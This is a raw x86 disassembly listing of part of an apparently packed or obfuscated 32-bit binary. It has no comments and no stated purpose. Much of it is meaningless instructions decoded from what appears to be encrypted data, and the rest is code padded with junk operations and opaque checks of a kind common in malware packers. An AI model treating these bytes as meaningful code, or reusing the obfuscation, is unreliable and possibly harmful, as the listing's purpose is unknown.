  412480:	call   0x96f3:0x36d4768d
  412487:	cwde   
  412488:	in     eax,dx
  412489:	loope  0x4124f8
  41248b:	lock xlat BYTE PTR ds:[ebx]
  41248d:	sub    al,0x70
  41248f:	dec    esi
  412490:	ret    
  412491:	lds    ebx,FWORD PTR [ebx-0x44ebf559]
  412497:	sbb    eax,0x442eba7a
  41249c:	dec    esp
  41249d:	sub    ecx,DWORD PTR [edi+ecx*2]
  4124a0:	repnz or DWORD PTR [ebx],ebp
  4124a3:	retf   0x28f2
  4124a6:	mov    ebx,0x409865ac
  4124ab:	jge    0x412437
  4124ad:	(bad)  [edi-0xb86ee07]
  4124b3:	or     al,0xb9
  4124b5:	repnz xchg edi,eax
  4124b7:	sub    ah,BYTE PTR [esi+0x48e2dac4]
  4124bd:	aam    0x58
  4124bf:	jp     0x41249e
  4124c1:	xor    dh,BYTE PTR [edi+ebx*4-0x48694f7c]
  4124c8:	dec    esi
  4124c9:	test   al,0x36
  4124cb:	imul   eax,DWORD PTR [edi],0xffffffed
  4124ce:	std    
  4124cf:	neg    DWORD PTR [eax]
  4124d1:	sub    bl,ch
  4124d3:	pusha  
  4124d4:	pop    edx
  4124d5:	lock xor al,0x6a
  4124d8:	mov    ds:0xf81f0e0c,al
  4124dd:	adc    eax,0xcb90f37c
  4124e2:	(bad)  
  4124e3:	xor    BYTE PTR [ebp-0x236ff042],bl
  4124e9:	push   cs
  4124ea:	add    al,0xb1
  4124ec:	push   esp
  4124ed:	call   0x2d7e:0xe5d6f8aa
  4124f4:	or     DWORD PTR ss:[ebx-0xd635ecc],0x12b3830a
  4124ff:	(bad)  
  412500:	popa   
  412501:	lds    ecx,FWORD PTR [ebx]
  412503:	frstpm(287 only) 
  412505:	dec    ebx
  412506:	mov    eax,0x484fddcf
  41250b:	hlt    
  41250c:	mov    bl,0x1c
  41250e:	shl    BYTE PTR [edi+0x1d],0xbd
  412512:	cli    
  412513:	dec    edx
  412514:	pop    DWORD PTR [esi+0xd]
  412517:	jle    0x412499
  412519:	inc    esp
  41251a:	push   ebp
  41251b:	test   ch,dl
  41251d:	je     0x4124d9
  41251f:	and    al,0x5
  412521:	sbb    eax,0x9d6c8376
  412526:	out    dx,eax
  412527:	fdiv   QWORD PTR [ecx-0x7b]
  41252a:	push   DWORD PTR [eax+0x65]
  41252d:	jo     0x412586
  41252f:	call   0x7b653b54
  412534:	pushf  
  412535:	xchg   ecx,eax
  412536:	clc    
  412537:	sbb    DWORD PTR [esi+0x23],esp
  41253a:	ds retf 
  41253c:	mov    ebp,0x57c54494
  412541:	rcl    esp,cl
  412543:	mov    ecx,edx
  412545:	(bad)  
  412546:	adc    ch,BYTE PTR [ebx+ebp*8]
  412549:	lea    ebx,[edx+0x8e3b528]
  41254f:	sub    bl,BYTE PTR es:[ebx+0x1b]
  412553:	push   edx
  412554:	push   ebx
  412555:	rcr    BYTE PTR [eax+ebp*4-0x66b7e47d],cl
  41255c:	mov    eax,ds:0x44232d3
  412561:	out    0x89,eax
  412563:	pop    esi
  412564:	fistp  WORD PTR gs:[ebp-0x23]
  412568:	dec    esi
  412569:	or     eax,0x78379e33
  41256e:	in     eax,dx
  41256f:	aas    
  412570:	ret    
  412571:	jnp    0x4124f4
  412573:	mov    esi,0xf902eacb
  412578:	cmc    
  412579:	mov    esi,0xddff9f83
  41257e:	xor    eax,ecx
  412580:	es dec ebx
  412582:	mov    DWORD PTR [ebx+ecx*2-0x60],esi
  412586:	mul    DWORD PTR [edi]
  412588:	add    edi,DWORD PTR [edx]
  41258a:	mov    edi,0x6dfeea8d
  41258f:	push   cs
  412590:	leave  
  412591:	retf   0xb3d6
  412594:	jecxz  0x412567
  412596:	inc    ebp
  412597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412598:	shr    BYTE PTR [esi+esi*4],1
  41259b:	or     eax,0x77900813
  4125a0:	fcomp  QWORD PTR [ebx]
  4125a2:	mov    dh,0xe4
  4125a4:	bound  ecx,QWORD PTR [ebx+ebp*8+0x4b5f993f]
  4125ab:	push   0xffffff9d
  4125ad:	jbe    0x412565
  4125af:	pushf  
  4125b0:	xchg   ecx,eax
  4125b1:	in     al,dx
  4125b2:	xchg   edi,eax
  4125b3:	xor    al,0x3a
  4125b5:	cmc    
  4125b6:	or     BYTE PTR [ebx-0x55c372fc],bl
  4125bc:	enter  0x4ce9,0xa1
  4125c0:	jmp    0xf07924e7
  4125c5:	neg    DWORD PTR [esi+0x42]
  4125c8:	dec    ebx
  4125c9:	adc    bh,BYTE PTR [esi-0x50]
  4125cc:	mov    esi,0x93f52035
  4125d1:	add    eax,0xdffceba8
  4125d6:	idiv   BYTE PTR [ebp+0x25]
  4125d9:	or     edi,DWORD PTR gs:[esi]
  4125dc:	inc    eax
  4125dd:	iret   
  4125de:	pop    ds
  4125df:	inc    esi
  4125e0:	les    ebx,FWORD PTR [ecx]
  4125e2:	imul   ecx,DWORD PTR [eax-0x290579b8],0xfba48295
  4125ec:	cmp    DWORD PTR [ebx+0x276baa95],ebx
  4125f2:	test   BYTE PTR [edx+ecx*1-0x69cae2c2],dh
  4125f9:	cmp    edi,DWORD PTR [ecx+edi*2-0x5d1df434]
  412600:	(bad)  
  412601:	mov    bl,0x53
  412603:	mov    edx,0x784595ce
  412608:	sahf   
  412609:	(bad)  
  41260a:	leave  
  41260b:	call   0xf556:0xfe4f14d6
  412612:	mov    cl,0xdc
  412614:	dec    ebp
  412615:	iret   
  412616:	push   esi
  412617:	jecxz  0x412601
  412619:	mov    dl,0x11
  41261b:	or     ebx,edx
  41261d:	fst    DWORD PTR [esi+0x4e]
  412620:	mov    esp,0x36e5de39
  412625:	mov    eax,0x2179a854
  41262a:	out    dx,al
  41262b:	ja     0x4125b4
  41262d:	dec    ebp
  41262e:	adc    ebp,DWORD PTR [ecx-0x55b59630]
  412634:	arpl   bp,cx
  412636:	push   cs
  412637:	in     al,dx
  412638:	inc    edi
  412639:	jle    0x4125fd
  41263b:	imul   edi,DWORD PTR [eax],0x10
  41263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41263f:	xchg   edi,eax
  412640:	ficomp WORD PTR [eax+0x45fd1034]
  412646:	jb     0x412662
  412648:	dec    eax
  412649:	call   0x169c6b00
  41264e:	in     al,dx
  41264f:	jns    0x41263a
  412651:	mov    WORD PTR [ecx+eiz*4],ds
  412654:	mov    esp,0x746bde3c
  412659:	enter  0x5031,0x8b
  41265d:	ins    BYTE PTR es:[edi],dx
  41265e:	push   esp
  41265f:	(bad)  
  412660:	xchg   ebp,eax
  412661:	gs in  al,0x7a
  412664:	or     DWORD PTR [ecx-0x46],esp
  412667:	add    DWORD PTR [edi],edi
  412669:	dec    ebp
  41266a:	push   es
  41266b:	test   al,0x3b
  41266d:	repz jmp 0x41269f
  412670:	mov    esi,0x980f7fd
  412675:	lahf   
  412676:	aaa    
  412677:	out    0x49,al
  412679:	or     al,0x53
  41267b:	(bad)  
  41267c:	adc    BYTE PTR [eax+0x2e0bfb9b],dh
  412682:	loopne 0x4126e0
  412684:	ror    al,cl
  412686:	in     al,dx
  412687:	adc    eax,0x14f518a5
  41268c:	push   esi
  41268d:	push   edi
  41268e:	xor    DWORD PTR ds:0x428555,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428351
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x428549
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428565
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42855d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428569,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x428419
  4126e3:	mov    DWORD PTR ds:0x428369,0x6012
  4126ed:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428561
  412718:	and    edx,DWORD PTR ds:0x428501
  41271e:	mov    DWORD PTR ds:0x428561,edx
  412724:	and    edi,DWORD PTR ds:0x428351
  41272a:	adc    DWORD PTR ds:0x428339,edi
  412730:	add    DWORD PTR ds:0x428571,edi
  412736:	mov    DWORD PTR ds:0x428469,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x428449,0x0
  41274a:	mov    DWORD PTR ds:0x428331,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42845d,0x50a2
  412760:	mov    DWORD PTR ds:0x428431,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428569,0x3c96
  412775:	cmp    DWORD PTR ds:0x428449,0x0
  41277c:	jne    0x41279e
  412782:	push   0x4282b5
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x428431,edi
  412796:	neg    DWORD PTR ds:0x428345
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42836d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x428449,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x428335,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42835d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x428449,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42846d
  4127dc:	mov    edi,DWORD PTR ds:0x42835d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x428449,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428369
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x428425
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x4284e9
  412817:	or     ebx,DWORD PTR ds:0x428441
  41281d:	mov    DWORD PTR ds:0x4284e9,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x428439,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x4284f9,0x0
  412846:	mov    DWORD PTR ds:0x428421,0x17f6
  412850:	mov    DWORD PTR ds:0x428425,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x4284dd
  412862:	cmp    DWORD PTR ds:0x4284f9,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x42841d,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x4283c5
  412886:	mov    edi,DWORD PTR ds:0x428525
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x4284c5,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428555
  4128a3:	sbb    ebx,DWORD PTR ds:0x428565
  4128a9:	cmp    DWORD PTR ds:0x428469,0x0
  4128b0:	mov    DWORD PTR ds:0x4284f5,0x3519
  4128ba:	mov    DWORD PTR ds:0x42856d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x428445
  4128cb:	mov    DWORD PTR ds:0x428361,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428469,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x4284b1
  4128f8:	mov    edi,DWORD PTR ds:0x4285bd
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x428549,ebx
  412909:	add    DWORD PTR ds:0x42855d,edx
  41290f:	sub    edi,DWORD PTR ds:0x4284f9
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428559
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428561,0x0
  412927:	movzx  edx,BYTE PTR ds:0x428411
  41292e:	mov    edi,DWORD PTR ds:0x428451
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x4284ed,0x3a54
  412943:	mov    DWORD PTR ds:0x428345,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428561,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x4284e5,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x428345,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428391
  412997:	mov    edi,DWORD PTR ds:0x42858d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428469,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422588
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x4227a8
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42849d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x4284dd,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x4284d5
  4129ed:	sbb    DWORD PTR ds:0x428361,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x42833d
  4129fc:	adc    DWORD PTR ds:0x428375,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x428335,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x782790d1
  412a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a22:	jecxz  0x412a80
  412a24:	jb     0x4129e4
  412a26:	mov    esi,0xbebec4ed
  412a2b:	lods   eax,DWORD PTR ds:[esi]
  412a2c:	xchg   esp,eax
  412a2d:	push   0x5fdc0692
  412a32:	add    ah,dh
  412a34:	clc    
  412a35:	scas   eax,DWORD PTR es:[edi]
  412a36:	mov    ch,0x6f
  412a38:	or     ch,bh
  412a3a:	inc    esi
  412a3c:	(bad)  
  412a3d:	xor    cl,bh
  412a3f:	dec    esi
  412a40:	outs   dx,BYTE PTR ds:[esi]
  412a41:	mov    esp,0xe298df4d
  412a46:	xlat   BYTE PTR ds:[ebx]
  412a47:	out    0xe3,al
  412a49:	mov    bh,0xd4
  412a4b:	mov    ah,0xb9
  412a4d:	push   ecx
  412a4e:	mov    eax,ds:0x68375e02
  412a53:	and    eax,0x1ad682d
  412a58:	aam    0xe4
  412a5a:	mov    ebx,0x38674569
  412a5f:	pop    es
  412a60:	mov    DWORD PTR [edi+0x66],edi
  412a63:	lock ins DWORD PTR es:[edi],dx
  412a65:	adc    eax,0x96650d17
  412a6a:	nop
  412a6b:	rcl    DWORD PTR [esi+edi*8],cl
  412a6e:	in     al,0x6a
  412a70:	scas   eax,DWORD PTR es:[edi]
  412a71:	sub    BYTE PTR [ecx+0x533be15d],bl
  412a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a78:	ret    
  412a79:	fcmovbe st,st(1)
  412a7b:	sub    edx,ecx
  412a7d:	push   edi
  412a7e:	xchg   ebx,eax
  412a7f:	or     BYTE PTR ds:0x8d2fc83e,dh
  412a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a86:	sub    al,BYTE PTR [esi-0x3b]
  412a89:	cmp    DWORD PTR [ebp+eiz*8-0x2a0a6990],esi
  412a90:	loop   0x412a3c
  412a92:	jno    0x412a76
  412a94:	cmc    
  412a95:	call   DWORD PTR [eax]
  412a97:	ins    BYTE PTR es:[edi],dx
  412a98:	add    esp,DWORD PTR [edi*4+0x6091af82]
  412a9f:	fdivr  QWORD PTR [ebx]
  412aa1:	sbb    al,0x9c
  412aa3:	test   BYTE PTR [ebx+ecx*4-0x1c],0x9
  412aa8:	xchg   edi,eax
  412aa9:	sbb    ch,bl
  412aab:	clc    
  412aac:	mov    bl,0x12
  412aae:	or     ecx,0x1f
  412ab1:	jb     0x412a54
  412ab3:	(bad)
  412ab6:	push   esp
  412ab7:	xor    al,0x6c
  412ab9:	in     al,0xef
  412abb:	and    DWORD PTR [ebx-0x9],esp
  412abe:	jns    0x412ad5
  412ac0:	push   esi
  412ac1:	jecxz  0x412a76
  412ac3:	push   eax
  412ac4:	add    DWORD PTR [ebp-0x3fb454b0],0xf79d45c7
  412ace:	stc    
  412acf:	ins    BYTE PTR es:[edi],dx
  412ad0:	pop    edx
  412ad1:	(bad)  
  412ad2:	jmp    0x686c5e90
  412ad7:	jno    0x412acf
  412ad9:	shr    al,cl
  412adb:	retf   
  412adc:	sbb    al,0x6
  412ade:	ldmxcsr DWORD PTR [esi]
  412ae1:	mov    edx,0x41aaf8a6
  412ae6:	adc    eax,0x33341a60
  412aeb:	jge    0x412b58
  412aed:	scas   eax,DWORD PTR es:[edi]
  412aee:	mov    BYTE PTR [esi-0x1],0x12
  412af2:	cli    
  412af3:	push   edi
  412af4:	xlat   BYTE PTR ds:[ebx]
  412af5:	jno    0x412b18
  412af7:	push   ebp
  412af8:	xor    DWORD PTR [ecx+esi*2-0x70d3e995],0x4852e1f5
  412b03:	lahf   
  412b04:	dec    eax
  412b05:	sbb    edi,DWORD PTR [eax+0x73]
  412b08:	sub    DWORD PTR [ecx],esi
  412b0a:	sub    al,BYTE PTR [ebx+0x78c1b22b]
  412b10:	jo     0x412b49
  412b12:	(bad)  
  412b13:	jge    0x412b8d
  412b15:	xchg   BYTE PTR [esp+esi*2+0x6a],dl
  412b19:	dec    ecx
  412b1a:	fsub   st,st(6)
  412b1c:	or     eax,0x6c5188a5
  412b21:	retf   
  412b22:	bound  ebx,QWORD PTR ds:0xbb669df8
  412b28:	mov    ecx,0xa7abd1e0
  412b2d:	push   cs
  412b2e:	fsub   st,st(2)
  412b30:	leave  
  412b31:	cmp    al,0xc1
  412b33:	pop    edi
  412b34:	add    dl,bl
  412b36:	mov    al,ds:0x81d581b8
  412b3b:	cmp    eax,0xf2d25e4b
  412b40:	ja     0x412bc0
  412b42:	lods   al,BYTE PTR ds:[esi]
  412b43:	jne    0x412bac
  412b45:	ror    BYTE PTR [edx+0x28],0x1f
  412b49:	sub    esi,DWORD PTR [ecx]
  412b4b:	sbb    BYTE PTR [ecx+ebx*1-0x70],dh
  412b4f:	jle    0x412bb0
  412b51:	inc    ebx
  412b52:	mov    eax,0x175b8d46
  412b57:	ret    
  412b58:	cs jle 0x412b37
  412b5b:	retf   
  412b5c:	cmp    cl,BYTE PTR [ebx-0x357a9854]
  412b62:	in     al,0x55
  412b64:	pop    esi
  412b65:	sub    ecx,eax
  412b67:	cmp    BYTE PTR [eax+0x19],bl
  412b6a:	push   cs
  412b6b:	sti    
  412b6c:	dec    esp
  412b6d:	jle    0x412afb
  412b6f:	lods   al,BYTE PTR ds:[esi]
  412b70:	scas   al,BYTE PTR es:[edi]
  412b71:	sahf   
  412b72:	mov    bh,0x3e
  412b74:	and    al,0x90
  412b76:	push   ss
  412b77:	xlat   BYTE PTR ds:[ebx]
  412b78:	and    DWORD PTR [esi-0x3a60d7fb],esi
  412b7e:	js     0x412bff
  412b80:	sahf   
  412b81:	and    bh,bl
  412b83:	fisttp WORD PTR cs:[eax-0x6c56460a]
  412b8a:	mov    bl,0xb2
  412b8c:	iret   
  412b8d:	sbb    DWORD PTR [eax],0xffffffa2
  412b90:	mov    dl,BYTE PTR [esi+0x34a93219]
  412b96:	jnp    0x412bfc
  412b98:	mov    al,0x54
  412b9a:	cld    
  412b9b:	repz mov ebx,0xf1c61bae
  412ba1:	jnp    0x412b47
  412ba3:	sar    edx,cl
  412ba5:	mov    ebx,0xfe4fce19
  412baa:	inc    edx
  412bab:	cmp    DWORD PTR [edi],ebx
  412bad:	jmp    0x65da:0xb7453874
  412bb4:	jle    0x412c13
  412bb6:	ret    0x3a79
  412bb9:	push   0xffffffb7
  412bbb:	xor    eax,0x8003f9e1
  412bc0:	mov    esi,0x73b3eee9
  412bc5:	adc    ah,dh
  412bc7:	jno    0x412b50
  412bc9:	scas   al,BYTE PTR es:[edi]
  412bca:	jmp    0x412bc4
  412bcc:	adc    BYTE PTR [eax-0x6b0e480d],dh
  412bd2:	mov    dh,0xea
  412bd4:	sub    ah,bh
  412bd6:	mov    esi,0x9709253
  412bdb:	(bad)  ds:0x4e2e7220
  412be1:	repz fwait
  412be3:	clc    
  412be4:	mov    ds:0x5b19af05,eax
  412be9:	test   dh,bl
  412beb:	xor    dh,BYTE PTR [ebp+0x14391f5f]
  412bf1:	pop    ebp
  412bf2:	push   esi
  412bf3:	dec    edi
  412bf4:	imul   eax,DWORD PTR [edi],0x30
  412bf7:	xor    edx,DWORD PTR [esi+ebx*8-0x60]
  412bfb:	(bad)
  412bfe:	test   eax,0xfb0445b5
  412c03:	push   eax
  412c04:	jo     0x412c6b
  412c06:	cmp    eax,0xab816786
  412c0b:	ja     0x412ba4
  412c0d:	mov    al,ds:0x9214ce74
  412c12:	dec    edi
  412c13:	or     edx,DWORD PTR ds:[ebp-0x2756522c]
  412c1a:	mov    al,ds:0x2041f30a
  412c1f:	lds    esp,FWORD PTR [edi-0x7297e84]
  412c25:	scas   al,BYTE PTR es:[edi]
  412c26:	jo     0x412bca
  412c28:	sbb    eax,0xd24f54c
  412c2d:	jge    0x412c13
  412c2f:	jae    0x412c12
  412c31:	lahf   
  412c32:	xchg   DWORD PTR [esi],edx
  412c34:	sbb    dh,ch
  412c36:	ja     0x412c8d
  412c38:	lea    edi,[esi-0x693380bf]
  412c3e:	jge    0x412bee
  412c40:	adc    DWORD PTR [ebx+esi*2],edx
  412c43:	cmp    BYTE PTR [edi-0x670c4388],cl
  412c49:	mov    ebp,0x46574e04
  412c4e:	mov    al,0x98
  412c50:	xor    al,0xfb
  412c52:	or     DWORD PTR [ecx-0x6a5696d6],0xffffff8c
  412c59:	call   0x3c82:0x1275f673
  412c60:	out    dx,al
  412c61:	aaa    
  412c62:	ja     0x412caf
  412c64:	pop    bp
  412c66:	lahf   
  412c67:	daa    
  412c68:	dec    esp
  412c69:	stc    
  412c6a:	and    BYTE PTR [edi-0x6b],ah
  412c6d:	data16 jl 0x412cae
  412c70:	add    ch,bh
  412c72:	in     al,dx
  412c73:	mov    ds:0xadeaa1e4,eax
  412c78:	jbe    0x412cb9
  412c7a:	jae    0x412ce1
  412c7c:	leave  
  412c7d:	out    dx,al
  412c7e:	mov    eax,0xaa9ba51
  412c83:	fsubp  st(4),st
  412c85:	mov    ah,0xd3
  412c87:	sub    eax,0x367ba680
  412c8c:	ss out dx,eax
  412c8e:	outs   dx,BYTE PTR ds:[esi]
  412c8f:	fnstcw WORD PTR [ecx+eiz*1+0x7c]
  412c93:	pushf  
  412c94:	sbb    ebx,ebx
  412c96:	add    edx,DWORD PTR [edi]
  412c98:	mov    dl,0x6d
  412c9a:	in     eax,dx
  412c9b:	scas   al,BYTE PTR es:[edi]
  412c9c:	and    eax,0xc7c16c3a
  412ca1:	iret   
  412ca2:	dec    eax
  412ca3:	iret   
  412ca4:	stos   DWORD PTR es:[edi],eax
  412ca5:	push   esi
  412ca6:	add    eax,0x47c3f3e7
  412cab:	lods   al,BYTE PTR ds:[esi]
  412cac:	out    0x44,eax
  412cae:	xchg   edi,eax
  412caf:	xor    bh,BYTE PTR [ebx]
  412cb1:	push   ecx
  412cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cb3:	inc    ebx
  412cb4:	adc    BYTE PTR [ebp+ecx*1+0x28],ah
  412cb8:	test   eax,0x381b33c0
  412cbd:	mov    eax,0xd076086d
  412cc2:	and    DWORD PTR [ebx],edi
  412cc4:	sub    al,0xec
  412cc6:	xchg   edi,eax
  412cc7:	pushf  
  412cc8:	pop    ecx
  412cc9:	(bad)
  412ccd:	dec    edx
  412cce:	push   eax
  412ccf:	mov    eax,ds:0x7c25200
  412cd4:	(bad)  
  412cd5:	sbb    al,0xe
  412cd7:	pop    ebx
  412cd8:	addr16 mov esp,0x5f24e294
  412cde:	and    edx,DWORD PTR [eax+0xd]
  412ce1:	xor    bh,0x98
  412ce4:	fstp   TBYTE PTR [esi]
  412ce6:	add    dl,BYTE PTR [ecx-0x142eea10]
  412cec:	mov    ch,0x2f
  412cee:	xor    al,0x88
  412cf0:	stc    
  412cf1:	mov    cl,dh
  412cf3:	ja     0x412cd1
  412cf5:	out    dx,eax
  412cf6:	lds    eax,FWORD PTR [edi+0xc]
  412cf9:	pop    esp
  412cfa:	pop    ecx
  412cfb:	or     DWORD PTR [ecx+0x3e85fa88],ebx
  412d01:	cwde   
  412d02:	jbe    0x412d2a
  412d04:	out    0xbd,eax
  412d06:	dec    ebx
  412d07:	xchg   ebx,eax
  412d08:	retf   0x516
  412d0b:	sar    BYTE PTR [edi-0x2d5cb586],1
  412d11:	div    DWORD PTR [edx+0x3c7a21aa]
  412d17:	xor    eax,0xad693999
  412d1c:	sub    al,0xb7
  412d1e:	(bad)  
  412d1f:	pop    esp
  412d20:	cmc    
  412d21:	push   cs
  412d22:	leave  
  412d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d24:	stos   DWORD PTR es:[edi],eax
  412d25:	xchg   ecx,eax
  412d26:	dec    DWORD PTR [edi]
  412d28:	and    ecx,DWORD PTR [edi]
  412d2a:	dec    esi
  412d2b:	aaa    
  412d2c:	push   ebx
  412d2d:	mov    ah,0x32
  412d2f:	stos   BYTE PTR es:[edi],al
  412d30:	sub    al,0xe2
  412d32:	and    ebp,DWORD PTR [esi-0x730dcc42]
  412d38:	popa   
  412d39:	mov    al,ds:0x49a20a8a
  412d3e:	dec    esi
  412d3f:	(bad)  
  412d40:	jnp    0x412cd6
  412d42:	dec    ebp
  412d43:	mov    bl,0x6
  412d45:	cmp    ebx,ecx
  412d47:	shl    eax,0x2
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428465,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x42842d,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428465,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42857d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428559,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x428411,0x4284e9
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x428449,0x4284e1
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x4284e1,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42855d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x4284e1,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
